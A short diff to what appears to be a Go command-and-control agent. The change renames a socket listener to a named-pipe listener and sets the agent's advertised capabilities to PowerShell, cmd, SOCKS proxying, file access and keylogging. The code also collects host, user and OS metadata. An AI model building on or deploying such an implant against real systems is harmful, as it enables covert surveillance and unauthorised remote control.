@@ -93,18 +93,18 @@ func (p *program) run() {
 		}
 	}()
 
-	// Handle socket listener
+	// Handle named pipe listener
 	var (
 		mu      sync.Mutex
 		builder strings.Builder
 	)
 
-	sock := windows_utils.New(pipeName, func(msg string) error {
+	named_pipe := windows_utils.New(pipeName, func(msg string) error {
 		mu.Lock()
 		defer mu.Unlock()
 
 		builder.WriteString(msg)
-		logger.Logf(logger.Debug, "Got message from socket at %v: %v", pipeName, msg)
+		logger.Logf(logger.Debug, "Got message from named pipe at %v: %v", pipeName, msg)
 		return nil
 	})
 
@@ -112,19 +112,19 @@ func (p *program) run() {
 	errCh := make(chan error, 1)
 
 	go func() {
-		errCh <- sock.Run(ctx)
+		errCh <- named_pipe.Run(ctx)
 	}()
 
 	go func() {
 		<-ctx.Done()
-		logger.Log(logger.Info, "Signal received, stopping socket...")
-		sock.Stop()
+		logger.Log(logger.Info, "Signal received, stopping named pipe...")
+		named_pipe.Stop()
 		stop()
 	}()
 
 	hostname, username := client_utils.GenerateAgentMetadata()
 	filepath := client_utils.GetExecutablePath()
-	capabilities := append(client_utils.DefaultCapabilities(), "keylogger", "cache_socket")
+	capabilities := []string{"powershell", "cmd", "socks", "files", "keylogger", "cache_named_pipe"}
 	logger.Logf(logger.Info, "Collected startup metadata. Hostname: %v. Username: %v", hostname, username)
 	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()
 
